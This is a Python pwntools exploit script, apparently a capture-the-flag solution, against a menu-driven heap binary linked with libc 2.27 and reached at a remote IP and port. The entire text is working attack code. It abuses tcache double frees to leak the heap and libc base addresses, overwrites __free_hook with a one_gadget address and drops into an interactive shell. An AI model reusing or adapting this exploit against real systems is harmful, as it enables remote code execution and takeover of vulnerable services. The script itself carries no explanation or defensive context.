#coding=utf-8
from pwn import*
def new(content):
	p.sendlineafter('>>','1')
	p.sendafter('your 36D:',content)
def free(index):
	p.sendlineafter('>>','2')
	p.sendlineafter('index:',str(index))
def show(index):
	p.sendlineafter('>>','3')
	p.sendlineafter('index:',str(index))
	
def modify(target,content):
	free(1)
	free(1)
	new(target)
	new('FMYY\n')
	new(content)
p = process('./main')
p = remote('124.156.121.112',28060)
libc =ELF('./libc-2.27.so',checksec=False)
context.log_level ='DEBUG'
new('FMYY\n')
new('FMYY\n')
new('FMYY\n')
new('FMYY\n')
new('FMYY\n')
free(1)
free(0)
free(0)
show(0)
heap_base = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - 0x10 - 0x250
log.info('HEAP:\t'+ hex(heap_base))
#--------------------
new(p64(heap_base + 0x270) + '\n')
new(p64(0) + p64(0xB1))
new('FAKE\n')
free(2)
modify(p64(heap_base+0x18) + '\n',p64(0xFF00) + '\n')
free(7)
show(7)


libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - 0x60 - 0x10 - libc.sym['__malloc_hook']
log.info('LIBC:\t' + hex(libc_base))
free_hook = libc.sym['__free_hook'] + libc_base
rce = libc_base + 0x4F322
modify(p64(free_hook) + '\n',p64(rce) + '\n')
free(4)
p.interactive()


